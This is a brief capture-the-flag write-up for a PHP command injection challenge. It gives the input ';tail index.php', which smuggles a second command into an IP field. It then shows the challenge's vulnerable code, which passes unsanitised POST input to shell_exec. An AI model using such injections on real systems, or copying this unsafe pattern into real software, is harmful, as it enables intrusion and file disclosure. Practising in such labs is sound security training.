# PHP - Command Injection

### Prerequires:

- <a>Nothing</a>

-----------------

- Need anything just type `;tail index.php` and here is the flag:

`php
$flag = "XXXXXXXXXXXXXXXXX";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
`
